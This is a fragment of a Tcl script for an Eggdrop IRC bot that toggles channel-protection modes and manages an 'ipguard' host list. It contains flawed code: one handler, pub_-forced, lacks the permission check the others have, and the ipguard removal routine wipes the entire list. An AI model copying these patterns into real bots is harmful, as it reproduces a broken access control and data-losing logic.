if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -V
setuser $cflag XTRA "VC" ""
puthlp "NOTICE $nick : AuTovoIcE $chan \[4OFF\]"
saveuser
foreach x [utimers] {
if {[string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
}
}
proc pub_+enforceban {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +E
puthlp "NOTICE $nick : enforceban $chan \[9ON\]"
saveuser
}
proc pub_-enforceban {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -E
puthlp "NOTICE $nick : enforceban $chan \[4OFF\]"
saveuser
}
proc pub_+revenge {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +D
puthlp "NOTICE $nick : revenge $chan \[9ON\]"
saveuser
}
proc pub_-revenge {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag -D
puthlp "NOTICE $nick : revenge $chan \[4OFF\]"
saveuser
}
proc pub_+forced {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
chattr $cflag +M
puthlp "NOTICE $nick : forced $chan \[9ON\]"
saveuser
}
proc pub_-forced {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
chattr $cflag -M
puthlp "NOTICE $nick : forced $chan \[4OFF\]"
saveuser
}
proc pub_-colour {nick uhost hand chan rest} {
global notc kickclr
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set kickclr "T"
setuser "config" XTRA "KCLR" "Y"
puthlp "NOTICE $nick : colour kick \[4OFF\]"
saveuser
}
proc pub_+colour {nick uhost hand chan rest} {
global notc kickclr
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
catch {unset kickclr}
setuser "config" XTRA "KCLR" ""
puthlp "NOTICE $nick : colour kick \[9ON\]"
saveuser
}
proc pub_+ipguard {nick uhost hand channel param} {
global botname botnick notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +ipguard <hostname>"
return 0
}
if {$rest == "*" || $rest == "*!*@*"} {
puthlp "NOTICE $nick : invalid hostname..!"
return 0
}
if {![string match "*@*" $rest]} {
puthlp "NOTICE $nick : Usage: +ipguard <hostname>"
return 0
}
set ipguard [getuser "config" XTRA "IPG"]
foreach y $ipguard {
if {$y == $rest} {
puthlp "NOTICE $nick : $rest allready added..!"
return 0
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
puthlp "NOTICE $nick : add \[$rest\] To IpguaRd"
lappend ipguard $rest
setuser "config" XTRA "IPG" $ipguard
saveuser
return 0
}
proc pub_-ipguard {nick uhost hand channel param} {
global notc 
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: -ipguard <hostname>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set ipguard [getuser "config" XTRA "IPG"]
set nipg ""
set ok "F"
foreach y $ipguard {
if {$y == $rest} {
set ok "T"
puthlp "NOTICE $nick : DeL \[$rest\] FRoM IpguaRd"
} {
lappend nipg
}
}
if {$ok == "T"} {
setuser "config" XTRA "IPG" $nipg
saveuser
return 0
}
puthlp "NOTICE $nick : $rest not founded..!"
}
putlog "Loaded i.tcl"
